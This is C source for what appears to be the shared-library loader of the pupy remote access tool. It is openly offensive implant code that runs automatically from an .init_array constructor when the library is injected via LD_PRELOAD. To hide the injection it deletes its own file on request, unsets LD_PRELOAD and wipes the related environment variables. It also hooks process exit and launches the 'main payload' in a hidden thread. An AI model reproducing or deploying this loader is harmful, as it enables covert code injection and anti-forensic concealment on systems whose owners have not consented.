#define _GNU_SOURCE
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

#include <dlfcn.h>

#include "pupy_load.h"
#include "tmplibrary.h"
#include "debug.h"

static pthread_t thread_id;

static int __argc = 0;
static char ** __argv = NULL;
static int __to_wait = 0;
static int __unmapped = -1;

static void *
thread_start(void *arg) {
    /*
     * We start from unstable state, no way to know
     * when libraries were fully loaded. While horribly racy,
     * sleep is better then nothing.
     */

	dfprint(stderr, "Launch dedicated thread\n");

	sleep(1);

#if defined(Linux) && defined(WIP_LMID)
    /*
     * Remap may be possible only after library load,
     */

    if (__unmapped != 0) {
        dprint("Try to remap again\n");

        struct link_map *link_map = NULL;
        void *self = dlopen(0, RTLD_LAZY);
        dprint("SELF: %p\n", self);

        if (self && dlinfo(self, RTLD_DI_LINKMAP, &link_map) == 0) {
            dprint("Library path: '%s'\n", link_map->l_name);
            if (link_map->l_name) {
                __unmapped = remap(link_map->l_name);
            }
        }
    }
#endif

	dfprint(stderr, "Starting main payload\n");
    mainThread(__argc, __argv, true);
    return NULL;
}

static void
unloader(void) {
    dprint("Wait until pupy thread exits\n");
    pthread_join(thread_id, NULL);
    dprint("Sutting down\n");
}

static void
__handle_exit(int status) {
    dprint("Catch exit (%d)\n", __to_wait);
    __attribute__((noreturn))
        void (*orig_exit)(int status) = dlsym(RTLD_NEXT, "_exit");

    if (__to_wait) {
        dprint("Hook exit\n");
        unloader();
    }

    orig_exit(status);
}

static void
__atexit() {
    dprint("At exit\n");
    __handle_exit(0);
}

static void
__on_exit(int status, void *data) {
    dprint("On exit\n");
    __handle_exit(status);
}

static void
_pupy_main(int argc, char* argv[], char* envp[]) {
	dfprint(stderr, "pupy loader ctor called\n");
	dfprint(stderr, "fill_argv called: %d/%p/%p\n", argc, argv, envp);
#ifdef DEBUG
    int i;
    for (i=0; i<argc; i++) {
        dfprint(stderr, "ARGV[%d] = %s\n", i, argv[i]);
    }
#endif

    char *ldpreload = getenv("LD_PRELOAD");
    char *cleanup = getenv("CLEANUP");
    char *hook_exit = getenv("HOOK_EXIT");

    __argc = argc;
    __argv = argv;

    if (hook_exit && strncmp(hook_exit, "1", 1) == 0)
        __to_wait = 1;

    if (ldpreload) {
        dfprint(stderr, "REMAP SELF\n0");
        __unmapped = remap(ldpreload);
    }

    if (cleanup && ldpreload && !strcmp(cleanup, "1")) {
        dfprint(stderr, "Cleanup requested. Cleanup %s\n", ldpreload);
        unlink(ldpreload);
    }

    if (ldpreload) {
        dfprint(stderr, "Unset LD_PRELOAD (%s)\n", ldpreload);
        unsetenv("LD_PRELOAD");
    }

    atexit(__atexit);

#ifdef Linux
    on_exit(__on_exit, NULL);
#endif

    while (*envp) {
        if ((strncmp(*envp, "LD_PRELOAD=", 11) == 0)
            || strncmp(*envp, "CLEANUP=", 8) == 0
            || strncmp(*envp, "HOOK_EXIT=", 10) == 0) {
            dfprint(stderr, "CLEAN %s\n", *envp);
            memset(*envp, 0, strlen(*envp));
        }
        envp++;
    }

    dfprint(stderr, "Start payload, wait=%d\n", __to_wait);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_create(
            &thread_id, &attr,
            thread_start, NULL);

	dfprint(stderr, "init_array completed\n");
}

__attribute__((section(".init_array"))) void (* pupy_main)(int, char*[], char*[]) = _pupy_main;
